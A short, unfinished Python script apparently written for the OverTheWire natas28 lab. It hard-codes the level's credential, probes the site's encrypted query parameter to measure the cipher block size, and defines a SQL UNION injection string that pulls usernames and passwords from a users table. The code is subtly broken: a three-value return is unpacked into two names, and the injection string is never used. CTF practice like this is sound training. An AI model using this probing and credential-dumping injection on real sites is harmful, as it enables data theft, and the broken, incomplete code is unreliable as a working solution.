# -*- coding: utf-8 -*-
from base import get_page, post_page
import re
import requests
from urllib.parse import unquote
from base64 import b64decode

def natas28():
    username="natas28"
    password = "JWwR438wkgTsNKBbcJoowyysdM82YjeF"

    padding, b_size = block_size()
    sql = " UNION ALL SELECT concat(username, 0x3A ,password) FROM users #"

    

def block_size():
    i = 0
    last_block_length = None
    while True:
        query = "a"*i
        current_block_length = len(cipher_text(query))
        if not last_block_length:
            last_block_length = current_block_length
        else:
            if current_block_length != last_block_length:
                return i-1, (current_block_length - last_block_length), last_block_length
        i += 1

def cipher_text(query):
    username="natas28"
    password = "JWwR438wkgTsNKBbcJoowyysdM82YjeF"
    url = "http://natas28.natas.labs.overthewire.org/"
    data = {"query":query}
    response = requests.post(url, auth=(username, password), data=data)
    return b64decode(unquote(response.url.split("query=")[1]))


if __name__ == "__main__":
    natas28()